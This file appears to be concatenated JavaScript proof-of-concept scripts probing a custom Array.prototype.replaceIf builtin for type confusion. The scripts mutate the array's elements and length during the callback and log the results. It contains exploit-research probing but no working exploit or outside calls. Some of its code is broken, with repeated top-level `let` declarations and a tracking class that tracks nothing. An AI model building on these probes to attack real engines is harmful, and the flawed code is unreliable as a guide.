// Vulnerability Proof of Concept for Array.prototype.replaceIf

// The vulnerability exists in the implementation of Array.prototype.replaceIf
// Let's create a test case that demonstrates this vulnerability

console.log("===== Array.prototype.replaceIf Vulnerability POC =====");

// Create an array
let arr = [1, 2, 3, 4, 5];
console.log("Original array:", arr);

// The vulnerability is in how the function handles the array object and its checking
// In the implementation, it retrieves the array element BEFORE calling the callback
// Then inside the callback, we can manipulate the array structure
// But the vulnerability is when it checks for "fast path" after the callback
// but doesn't properly re-check the element at the index

// Let's create a JSArray subclass to track accesses
class TrackedArray extends Array {
    constructor(...args) {
        super(...args);
        this.getCount = 0;
        this.setCount = 0;
    }

    get(index) {
        console.log(`[Get] Access at index ${index}`);
        this.getCount++;
        return super[index];
    }

    set(index, value) {
        console.log(`[Set] Setting index ${index} to ${value}`);
        this.setCount++;
        super[index] = value;
    }
}

// Create our target array
let targetArr = [10, 20, 30, 40, 50];
console.log("Target array:", targetArr);

// Demonstrate the vulnerability
console.log("\nExploiting vulnerability:");
let result = targetArr.replaceIf(2, function(element) {
    console.log("Callback received element:", element);

    // The element at index 2 is fetched BEFORE this callback is executed
    // We can modify the array structure during the callback
    // This can lead to type confusion when the replacement happens

    // Change the array structure during callback
    targetArr[2] = { x: 10, y: 20 }; // change a number to an object

    console.log("Array after modification:", targetArr);
    return true; // We want to trigger the replacement
}, "replacement");

console.log("Replace result:", result);
console.log("Final array:", targetArr);

// Now let's try to demonstrate a more severe type confusion

console.log("\n===== Type Confusion Demonstration =====");

function arrayTypeConfusion() {
    let targetArray = [1, 2, {prop: "original"}, 4, 5];
    console.log("Original array:", JSON.stringify(targetArray));

    // We'll try to replace an object with a different object
    let replaced = targetArray.replaceIf(2, function(obj) {
        console.log("Callback received:", JSON.stringify(obj));

        // During callback, change the array element type
        // This creates a mismatch between what was passed to the callback
        // and what exists in the array when the replacement happens
        targetArray[2] = 999; // Change object to number

        console.log("Array during callback:", targetArray);
        return true;
    }, {newProp: "replacement"});

    console.log("Replace result:", replaced);
    console.log("Final array:", targetArray);
}

arrayTypeConfusion();

// Testing the effect of array.length manipulation

console.log("\n===== Length Manipulation Test =====");

function testLengthManipulation() {
    let arr = [1, 2, 3, 4, 5];
    console.log("Original array:", arr);

    let result = arr.replaceIf(2, function(element) {
        console.log("Callback received element:", element);

        // Manipulate array length during callback
        arr.length = 1; // Shrink the array

        console.log("Array after length change:", arr);
        return true;
    }, "replacement");

    console.log("Replace result:", result); // Should be false because index 2 is now out of bounds
    console.log("Final array:", arr);
}

testLengthManipulation();

// Type Confusion Vulnerability Test Case for Array.prototype.replaceIf

// The vulnerability is related to how the implementation handles array modifications
// between getting the element and setting the replacement
// We can manipulate the array's structure during the callback function
// potentially leading to type confusion

console.log("==== Type Confusion in Array.prototype.replaceIf ====");

// Create an array with different types of elements
let arr = [1, "string", {key: "value"}, [1,2,3], new ArrayBuffer(8)];
console.log("Original array:", arr);

// Helper to print detailed array info
function inspectArray(array) {
    console.log("Array elements:");
    for (let i = 0; i < array.length; i++) {
        console.log(`  [${i}]: ${array[i]} (${typeof array[i]})`);
    }
}

inspectArray(arr);

// Let's demonstrate the key vulnerability:
// 1. The implementation gets the element at index
// 2. It calls the callback with that element
// 3. During the callback, we can change the array's structure
// 4. The implementation then sets the replacement, potentially to a different type of slot

console.log("\nTesting vulnerability:");

// Case 1: Replace object with string when element type has changed
console.log("\nCase 1: Object replacement after type change");
let obj = {test: "original"};
let test1 = [1, 2, obj, 4, 5];
console.log("Before:", test1[2]);

test1.replaceIf(2, (element) => {
    console.log("Callback received:", element);
    console.log("Is original object?", element === obj);

    // Change array element type during callback
    test1[2] = 999; // Change from object to number

    return true;
}, {test: "replaced"});

console.log("After:", test1[2]);
console.log("Is object?", typeof test1[2] === 'object');

// Case 2: Replace element when array has been shrunk
console.log("\nCase 2: Array length manipulation");
let test2 = [1, 2, 3, 4, 5];
console.log("Before:", test2);

let result = test2.replaceIf(3, (element) => {
    console.log("Callback received:", element);

    // Shrink array during callback
    test2.length = 2;

    return true;
}, "replacement");

console.log("Replace result:", result);
console.log("After:", test2);

// Case 3: Testing proxy behavior
console.log("\nCase 3: Testing proxy behavior");
let target = [10, 20, 30, 40, 50];
let handler = {
    get: function(obj, prop) {
        console.log(`Proxy get: ${prop}`);
        return obj[prop];
    },
    set: function(obj, prop, value) {
        console.log(`Proxy set: ${prop} = ${value}`);
        obj[prop] = value;
        return true;
    }
};

let proxy = new Proxy(target, handler);
console.log("Proxy array:", proxy);

proxy.replaceIf(2, (element) => {
    console.log("Callback received:", element);

    // Manipulate target during callback
    target[2] = {x: 100};

    return true;
}, "proxy-replacement");

console.log("After:", target);

// Let's try to check if we can cause a more severe type confusion
console.log("\nCase 4: Array element type conversion");
let test4 = [1, 2, {sub: {nested: "value"}}, 4, 5];
console.log("Before:", JSON.stringify(test4[2]));

test4.replaceIf(2, (element) => {
    console.log("Callback received:", JSON.stringify(element));

    // Change from object to array
    test4[2] = [9, 8, 7];

    return true;
}, {replaced: true});

console.log("After:", JSON.stringify(test4[2]));

// Deep Analysis of Array.prototype.replaceIf Vulnerability

console.log("===== Deep Analysis of replaceIf Vulnerability =====");

// First, let's examine how replaceIf works normally
function testBasicFunctionality() {
    console.log("\n--- Basic Functionality Test ---");
    let arr = [1, 2, 3, 4, 5];
    console.log("Original array:", arr);

    // Replace element at index 2 if callback returns true
    let result = arr.replaceIf(2, (element) => {
        console.log("Callback received:", element);
        return element > 2; // Should be true for 3
    }, "replaced");

    console.log("Replace result:", result);
    console.log("Final array:", arr);
}

// Testing vulnerability with object property modification
function testObjectPropertyManipulation() {
    console.log("\n--- Object Property Manipulation Test ---");
    let obj = {value: 100};
    let arr = [1, 2, obj, 4, 5];
    console.log("Original array:", arr);
    console.log("Original object:", JSON.stringify(obj));

    arr.replaceIf(2, (element) => {
        console.log("Callback received:", JSON.stringify(element));

        // Modify the object's properties
        element.value = 999;

        // Also change the array element itself
        arr[2] = {newValue: "changed"};

        return true;
    }, {replacedValue: "replacement"});

    console.log("Final array:", arr);
    console.log("Original object after callback:", JSON.stringify(obj));
}

// Testing the memory safety vulnerabilities
function testMemorySafety() {
    console.log("\n--- Memory Safety Test ---");

    // Create an array with specific types
    let arr = [
        1,                  // Number
        "string",           // String
        {key: "value"},     // Object
        [10, 20, 30],       // Array
        new ArrayBuffer(8)  // ArrayBuffer
    ];

    console.log("Original array types:");
    arr.forEach((item, i) => {
        console.log(`  [${i}]: ${typeof item}`);
    });

    // Try to cause type confusion
    for (let i = 0; i < arr.length; i++) {
        let originalType = typeof arr[i];
        console.log(`\nTesting index ${i} (${originalType}):`);

        let replaced = arr.replaceIf(i, (element) => {
            console.log(`  Got element: ${element} (${typeof element})`);

            // Change the element to a different type during callback
            let newElement;
            switch (originalType) {
                case 'number': newElement = "changed-to-string"; break;
                case 'string': newElement = {changed: "to-object"}; break;
                case 'object': 
                    if (Array.isArray(element)) {
                        newElement = 999;
                    } else if (element instanceof ArrayBuffer) {
                        newElement = "changed-buffer";
                    } else {
                        newElement = [1, 2, 3];
                    }
                    break;
            }

            console.log(`  Changing to: ${newElement} (${typeof newElement})`);
            arr[i] = newElement;

            return true;
        }, `replacement-${i}`);

        console.log(`  Result: ${replaced}, New element: ${arr[i]} (${typeof arr[i]})`);
    }
}

// Testing array modifications during callback
function testArrayModifications() {
    console.log("\n--- Array Modification Test ---");

    let arr = [10, 20, 30, 40, 50];
    console.log("Original array:", arr);

    // Test 1: Changing array length during callback
    console.log("\nTest 1: Length modification");
    let test1 = [...arr];
    test1.replaceIf(2, (element) => {
        console.log("  Before length change:", test1);
        test1.length = 2;
        console.log("  After length change:", test1);
        return true;
    }, "replacement");
    console.log("Final array:", test1);

    // Test 2: Deleting elements during callback
    console.log("\nTest 2: Deleting elements");
    let test2 = [...arr];
    test2.replaceIf(2, (element) => {
        console.log("  Before deletion:", test2);
        delete test2[1];
        delete test2[2];
        console.log("  After deletion:", test2);
        return true;
    }, "replacement");
    console.log("Final array:", test2);

    // Test 3: Adding elements during callback
    console.log("\nTest 3: Adding elements");
    let test3 = [...arr];
    test3.replaceIf(2, (element) => {
        console.log("  Before addition:", test3);
        test3.push(60, 70, 80);
        console.log("  After addition:", test3);
        return true;
    }, "replacement");
    console.log("Final array:", test3);
}

// Testing behavior with non-standard array objects
function testNonStandardArrays() {
    console.log("\n--- Non-standard Array Test ---");

    // Test with array-like object
    console.log("\nTest with array-like object:");
    let arrayLike = {
        0: 10,
        1: 20,
        2: 30,
        3: 40,
        length: 4
    };

    try {
        Array.prototype.replaceIf.call(arrayLike, 2, (element) => {
            console.log("  Got element:", element);
            return true;
        }, "replacement");
        console.log("  After call:", arrayLike);
    } catch (e) {
        console.log("  Error:", e.message);
    }

    // Test with sparse array
    console.log("\nTest with sparse array:");
    let sparse = [];
    sparse[0] = 10;
    sparse[5] = 50; // Leaving indices 1-4 empty
    console.log("  Sparse array:", sparse, "length:", sparse.length);

    sparse.replaceIf(3, (element) => {
        console.log("  Got element:", element);
        return true;
    }, "replacement");
    console.log("  After call:", sparse);
}

// Test all the functions
testBasicFunctionality();
testObjectPropertyManipulation();
testMemorySafety();
testArrayModifications();
testNonStandardArrays();

